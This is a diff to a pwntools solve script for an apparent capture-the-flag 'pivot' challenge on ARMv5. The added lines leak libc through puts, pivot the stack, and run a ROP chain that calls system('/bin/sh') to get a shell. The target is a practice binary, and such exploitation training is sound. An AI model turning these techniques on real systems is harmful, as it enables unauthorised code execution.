@@ -9,6 +9,7 @@ Run against remote with:
 
 splash()
 elf = context.binary = ELF("./pivot_armv5")
+libc = ELF("/etc/qemu-binfmt/arm/lib/libc.so.6", checksec = False)
 
 
 class ROPS:
@@ -17,6 +18,10 @@ class ROPS:
     pop_r4    = 0x00010760  # pop {r4, pc};
     pop_all   = 0x00010984  # pop {r4, r5, r6, r7, r8, sb, sl, pc};
     mov_r0_r7 = 0x00010974  # mov r0, r7; blx r3;
+
+
+class LIBC_ROPS:
+    mov_r0_pop = 0x00031be4  # mov r0, r4; pop {r4, pc};
 
 
 def conn():
@@ -33,6 +38,11 @@ def extract_pivot(io):
     io.recvuntil(b"place to pivot: ")
     return int(io.recvline()[:-1], 16)
 
+
+def extract_libc_base(io):
+    io.recvuntil(b"Thank you!\n")
+    leak = int.from_bytes(io.recv(4), "little")
+    return leak - libc.sym.puts
 
 
 def solve():
@@ -79,6 +89,31 @@ def solve():
 
     io.sendlineafter(b"> ", flat(payload))
     io.sendlineafter(b"> ", flat(pivot))
+
+    libc.address = extract_libc_base(io)
+    log.info(f"LIBC base: {hex(libc.address)}")
+
+    pivot_point2 = extract_pivot(io)
+    log.info(f"Pivot point 2: {hex(pivot_point2)}")
+
+    payload2 = [
+        next(libc.search(b"/bin/sh\0")),
+        0xDEADBEEF,
+        LIBC_ROPS.mov_r0_pop + libc.address,
+        0xDEADBEEF,
+        libc.sym.system
+    ]
+
+    pivot2 = [
+        padding,
+        ROPS.pop_r4,
+        pivot_point2 + 1,
+        ROPS.pivot
+    ]
+
+    io.sendlineafter(b"> ", flat(payload2))
+    io.sendlineafter(b"> ", flat(pivot2))
+
     io.interactive()
 
 
